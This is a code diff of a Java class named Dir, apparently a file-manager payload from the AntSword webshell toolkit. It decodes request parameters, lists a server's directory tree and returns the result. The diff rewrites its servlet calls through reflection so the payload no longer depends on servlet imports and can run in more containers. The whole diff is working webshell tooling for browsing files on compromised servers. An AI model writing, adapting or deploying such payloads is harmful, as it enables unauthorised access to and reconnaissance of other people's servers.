@@ -1,7 +1,5 @@
 package filemanager;
 
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 import java.io.File;
 import java.lang.reflect.Field;
 import java.nio.charset.Charset;
@@ -9,8 +7,8 @@ import java.text.SimpleDateFormat;
 
 
 public class Dir {
-    public HttpServletRequest request = null;
-    public HttpServletResponse response = null;
+    public Object request = null;
+    public Object response = null;
     public String encoder = "base64";
     public String cs = "antswordCharset";
     public String randomPrefix = "antswordrandomPrefix";
@@ -27,17 +25,18 @@ public class Dir {
         String varkeydecoder = "antswordargdecoder";
 
         try {
-            response.setContentType("text/html");
-            request.setCharacterEncoding(String.valueOf(cs));
-            response.setCharacterEncoding(String.valueOf(cs));
-            String z1 = decode(request.getParameter(varkey1));
-            this.decoderClassdata = decode(request.getParameter(varkeydecoder));
+            response.getClass().getMethod("setContentType", String.class).invoke(response, "text/html");
+            request.getClass().getMethod("setCharacterEncoding", String.class).invoke(request, cs);
+            response.getClass().getMethod("setCharacterEncoding", String.class).invoke(response, cs);
+            String z1 = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkey1));
+            this.decoderClassdata = decode((String) request.getClass().getMethod("getParameter", String.class).invoke(request, varkeydecoder));
             output.append(FileTreeCode(z1));
         } catch (Exception e) {
-            output.append("ERROR:// " + e.toString());
+            output.append("ERROR:// " + e);
         }
         try {
-            response.getWriter().print(tag_s + this.asoutput(output.toString()) + tag_e);
+            Object writer = response.getClass().getMethod("getWriter").invoke(response);
+            writer.getClass().getMethod("print", String.class).invoke(writer, tag_s + this.asoutput(output.toString()) + tag_e);
         } catch (Exception ignored) {
         }
         return true;
@@ -88,29 +87,26 @@ public class Dir {
     public void parseObj(Object obj) {
         if (obj.getClass().isArray()) {
             Object[] data = (Object[]) obj;
-            request = (HttpServletRequest) data[0];
-            response = (HttpServletResponse) data[1];
+            request = data[0];
+            response = data[1];
         } else {
             try {
-                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+                request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+                response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
             } catch (Exception e) {
-                if (obj instanceof HttpServletRequest) {
-                    request = (HttpServletRequest) obj;
+                request = obj;
+                try {
+                    Field req = request.getClass().getDeclaredField("request");
+                    req.setAccessible(true);
+                    Object request2 = req.get(request);
+                    Field resp = request2.getClass().getDeclaredField("response");
+                    resp.setAccessible(true);
+                    response = resp.get(request2);
+                } catch (Exception ex) {
                     try {
-                        Field req = request.getClass().getDeclaredField("request");
-                        req.setAccessible(true);
-                        HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                        Field resp = request2.getClass().getDeclaredField("response");
-                        resp.setAccessible(true);
-                        response = (HttpServletResponse) resp.get(request2);
-                    } catch (Exception ex) {
-                        try {
-                            response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                        } catch (Exception ignored) {
+                        response = request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                    } catch (Exception ignored) {
 
-                        }
                     }
                 }
             }
